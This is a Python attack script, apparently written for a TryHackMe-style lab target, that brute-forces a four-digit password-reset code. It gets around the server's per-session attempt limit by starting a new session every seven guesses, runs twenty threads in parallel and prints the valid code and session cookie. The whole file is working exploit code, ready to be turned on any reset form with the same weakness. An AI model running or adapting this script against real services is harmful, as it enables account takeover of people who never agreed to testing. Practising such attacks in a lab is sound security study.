#!/usr/bin/env python3

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

TARGET = "http://10.48.132.73:1337/reset_password.php"
EMAIL = "tester@hammer.thm"

# Maximum attempts allowed per session
ATTEMPTS_PER_SESSION = 7

# Number of concurrent workers
MAX_WORKERS = 20

# Event used to stop workers after finding the valid OTP
found_event = Event()


def get_new_session():
    """
    Initiate password reset and obtain a fresh PHPSESSID.
    """
    session = requests.Session()

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    response = session.post(
        TARGET,
        data={"email": EMAIL},
        headers=headers,
        allow_redirects=False,
        timeout=10
    )

    response.raise_for_status()

    php_session = session.cookies.get("PHPSESSID")

    if not php_session:
        raise RuntimeError("PHPSESSID was not returned")

    return session


def test_batch(batch):
    """
    Test up to 7 OTPs using one PHP session.
    """

    if found_event.is_set():
        return None

    try:
        session = get_new_session()

        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        for otp in batch:

            if found_event.is_set():
                return None

            otp_str = f"{otp:04d}"

            response = session.post(
                TARGET,
                data={
                    "recovery_code": otp_str,
                    "s": "180"
                },
                headers=headers,
                timeout=10
            )

            # Adjust this string if your lab response uses different wording.
            if "Invalid or expired recovery code" not in response.text:

                found_event.set()

                return {
                    "otp": otp_str,
                    "session": session.cookies.get("PHPSESSID"),
                    "status": response.status_code,
                    "response": response.text
                }

        return None

    except requests.RequestException as e:
        print(f"[!] Batch error: {e}")
        return None


def main():

    # Create batches of 7 codes:
    batches = []

    for start in range(0, 10000, ATTEMPTS_PER_SESSION):
        batch = range(
            start,
            min(start + ATTEMPTS_PER_SESSION, 10000)
        )

        batches.append(batch)

    print(f"[+] OTPs to test : 10000")
    print(f"[+] Batch size   : {ATTEMPTS_PER_SESSION}")
    print(f"[+] Batches      : {len(batches)}")
    print(f"[+] Workers      : {MAX_WORKERS}")
    print()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:

        futures = {
            executor.submit(test_batch, batch): batch
            for batch in batches
        }

        for future in as_completed(futures):

            result = future.result()

            if result:

                print("\n[+] VALID OTP FOUND!")
                print(f"[+] OTP       : {result['otp']}")
                print(f"[+] PHPSESSID : {result['session']}")
                print(f"[+] Status    : {result['status']}")

                print("\n----- Response -----")
                print(result["response"])

                # Cancel futures that have not started yet
                for f in futures:
                    f.cancel()

                return

    print("\n[-] No valid OTP found.")


if __name__ == "__main__":
    main()
